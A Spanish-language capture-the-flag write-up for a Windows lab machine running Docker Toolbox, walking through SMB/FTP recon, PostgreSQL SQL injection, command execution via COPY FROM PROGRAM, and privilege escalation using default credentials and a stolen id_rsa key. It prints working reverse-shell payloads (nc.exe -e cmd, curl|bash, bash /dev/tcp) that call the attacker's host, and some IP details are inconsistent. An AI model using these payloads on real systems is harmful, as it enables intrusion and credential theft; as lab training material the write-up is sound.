## Summary

Tags: #SMB #FTP #BurpSuite #HTTPS #PostgreSQL #Netcat #Docker #Contenedor #Windows #RCE #ReverShell #DockerToolbox #Id_RSA #Nmap 

- IP -> 10.10.11.130
- Ports -> TCP (21,22,135139,443,445,5985), UDP (idk)
- OS ->  Windows
- Services & Applications
    - 21 -> FTP
    - 22 -> SSH
    - 135 -> RPC
    - 443 -> HTTPS
    - 445 -> SMB
    - 5985 -> WinRM

## Recon

```bash
❯ smbclient -L ❮IP❯                   # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
❯ smbclient -L ❮IP❯ -N                # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
```

```bash
❯ smbmap -H ❮IP❯                      # Herramienta elternativa para ver si nos reporta algo mas y nos reporta los permisos (WRITE, READ)
❯ smbmap -H ❮IP❯ -u 'null'            # Herramienta elternativa para ver si nos reporta algo mas haciendo uso de un null sesion (sin credencial alguna)
```

```bash
❯ crackmapexec smb ❮IP❯               # Para listar recursos compartidos de Windows
```

Anonimous esta permitido
```bash
❯ ftp ❮IP❯                               # Si el servidor nos lo permite nos podemos conectar como Anonymous sin colocar password.
```
Encontramos un archivo que se llama 'Docker-Toolbox'

```bash
❯ openssl s_client -connect ❮IP❯:443     # Para conectarnos al openssl e inspeccionar el certificado del puerto 443
```
Encontramos un nuevo dominio 'admin.megalogistic.com'
Lo agregamos al **/etc/hosts** y despues entramos a la web para ver que hay y encontramos un panel de autenticacion que la momento de hacerle una inyeccion SQL este nos devuelve un error y nos pone que hay un **PostgreSQL**.

Ahora nos disponemos a abrir BurpSuite e iunterceptaremos las peticiones de la pagina 
* Nos damos cuenta que la data esta viajando por url-encode, por lo que hacemos **Ctrl + Shift + u** para url-decodear
* Buscamos en Google 'HackTricks: [Hacktricks-PostgreSQL](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection)' SQLI para **PostgreSQL** y encontramos lo siguiente 
```bash
❯ username=1' ; select pg_sleep(5);-- - $password=1'    # La web debe de tardar 5 seg en responder 
```

Ahora como podemos injectar comandos, podemos tener un **RCE (Remote Code Execution**) 
* [HackTricks-PostgreSQL-RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program)
```bash
❯ DROP TABLE IF EXISTS cmd_exec;                    # Elimina la tabla si es que existe
❯ CREATE TABLE cmd_exec(cmd_output text);           # Crea una tabla 
❯ COPY cmd_exec FROM PROGRAM 'id';                  # Por medio de esa tabla podemos inyectar un comando 
❯ SELECT * FROM cmd_exec;
```

Podemos colocar un **+** para los espacios o seleccionar y poner **Ctrl + u** y url-encodeamos, para poder colocarlos en BurpSuite y este no nos arrije un error
```bash
❯ CREATE+TABLE+cmd_exec(cmd_output+text);--+-                              # Creamos una tabla 
❯ COPY+cmd_exec+FROM+PROGRAM+'\\10.10.14.2\smbFolder\nc.exe+-e+cmd+10.10.14.2+443';--+-          # Por medio de esa tabla podemos inyectar un comando, este nos ayudara a conectarnos a un recurso compartido
	# IP = IP de atacante 
	# smbFolder = Nombre del folder del recurso compartido
	# nc.exe = Netcat para Windows
	# cmd = Entablar una ReverShell con la maquina de atacante
	# 443 = Puerto de la ReverShell de la maquina de atacante 
```

Buscamos Netcat en nuestra maquina de atacante y lo colocamos en el folder que vamos a compartir, este Netcat es para Windows
```bash 
❯ locate nc.exe
```

Para compartir los recursos con la maquina victima 
```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un servicio con SMB 

	# smbFolder = Nos creara un servicio compartido llamado 'smbFolder'
	# pwd = Sincronizado con la ruta absoluta actual 
	# smb2support = En Windows 10 le damos soporte a la version 2
```

Nos ponemos en modo escucha para recibir la ReverShell de la maquina victima 
```bash
❯ rlwrap nc -nlvp 443

	# nc = Netcat 
	# n = No DNS
	# l = Modo escucha, conexiones entrantes
	# v = verbose
	# p = numero local de puerto en esucha

```


Miramos que no se conecta, enotnces lo intentamos como si fuera una maquina Linux
```bash
❯ COPY+cmd_exec+FROM+PROGRAM+'curl+10.10.14.2/Shell|bash';--+-          # Por medio de esa tabla podemos inyectar un comando, este nos ayudara a que la maquina victima busque el archivo Shell que contiene la ReverShell en nuestra maquina de atacante y lo procese con bash 
```

Creamos el archivo de la ReverShell
```bash
nvim Shell
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.13/443 0>&1
```

```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para compartir el recurso 
```

```bash
❯ nc -nlvp 443                              # nos ponemos en escucha para recibir la ReverShell
```

## User

Una vez dentro, nos damos cuenta que estamos denmtro de un contenedor '127.17.0.2'
```bash
❯ hostname -I                                # Nos muestra solo la direccion IP
```
Hacemos tratamiento de la pseudo-consola

* Buscamos en Google credenciales tipicas de [docker-toolbox](https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password) y nos muestra estas: **user:docker, passwd:tcuser**
* Buscaremos que puertos estan abiertos en la maquina victima 

```bash
❯ route -n                                   # Para mirar las routing tables y encontramos la 127.17.0.1
```

Por si el comando **ping** no esta disponible
```bash
❯ (echo ‘’ > /dev/tcp/172.16.0.1/22) 2>/dev/null && echo “[+] Puerto abierto” || echo “[+] Puerto cerrado”
```
Nos damos cuenta que el puero 22 del contenedor esta OPEN, por lo que procedemos a conectarnos con SSH 

```bash
❯  ssh docker@127.17.0.1                                    # Para conectarnos por ssh en el puerto default 22 del contenedor docker
```
Entramos a la inteface y nos damos cuenta que somos el usuario 'docker' 

```bash
❯ whoami                                           # Miramos el nombre del usuario
```

```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoers (l=ele)

	# (ALL : ALL) ALL
	# (root) NOPASSWD: /usr/bin/find -> Puede ejecutar un comando sin necesidad de password
```
Miramo que nos podemos convertir en root en el contenedor y eso nos ayudara a buscar la flag user.txt

Buscaremos la flag dentro del usaurio docker, pero o hay nada. Por lo que la buscaremos en la maquina de manera general.
```bash
❯ find  / -name file.txt 2>/dev/null               # Para buscar un archivo en el sistema desde la raiz
```

Ahora nos dirijimos a la raiz '/' y encontramos un dir **'C > Users > Administrator'**, esta es la estructura de Windows. 
```bash
❯ ls -la                          # Podemos observar todos los archivos del dir inclyendo los ocultos 
```
Encontramos un dir **.ssh**. Esto quiere decir que puede que exista un **id_rsa**, copiamos su contenido en nuestra maquina de atacante en un archivo llamada 'id_rsa' y le damos el privilegio 600

 ```bash
❯ chmod 600 id_rsa                              # Para darle un permiso 600 a la id_rsa      
```

```bash
❯ ssh -i id_rsa Administrator@10.10.10.236      # Nos conectamos por ssh teniendo un id_rsa con privilegio 600
```
Nos podemos conectar desde nuestra maquina de atacante ya que en el escaneo de nmap, observamos que el puerto 22 estaba OPEN

## Root

Somo el usuario 'Administrator'  en Windows  
```bash
❯ whoami                                           # Miramos el nombre del usuario
```

```bash
❯ ipconfig                                         # Nos muestra las interfaces y las direcciones IP de Windows
```
Miramos que estemos dentro de la IP de la maquina victima

Nos ponemos a buscar la flag root.txt